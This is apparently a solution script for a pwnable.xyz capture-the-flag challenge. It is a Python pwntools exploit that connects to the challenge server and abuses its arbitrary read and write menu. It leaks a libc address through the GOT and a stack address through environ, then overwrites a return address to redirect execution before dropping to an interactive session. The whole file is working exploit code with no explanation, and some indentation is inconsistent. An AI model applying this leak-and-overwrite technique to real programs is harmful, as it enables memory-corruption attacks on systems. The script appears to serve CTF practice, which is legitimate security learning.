from pwn import *

context.log_level = 'debug'

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30019)
e = ELF("challenge")
libc = ELF("alpine-libc-2.28.so")
#libc = e.libc

def read_func(addr):
	s.sendlineafter("> ","1")
	s.recvuntil("Addr: ")
	s.send(str(addr))

def write_func(addr,value):
	s.sendlineafter("> ","2")
        s.recvuntil("Addr: ")
        s.send(str(addr))
	s.recvuntil("Value: ")
	s.send(str(value))

#pause()

offset = 0x85d0768

read_func(0x600ff8)

leak = u64(s.recv(6).ljust(8,"\x00")) - libc.symbols['exit']
env = leak + libc.symbols['environ']

read_func(env)

stack = u64(s.recv(6).ljust(8,"\x00"))
print hex(stack)
ret = stack - 0xf0

write_func(ret,0x400905)

s.interactive()
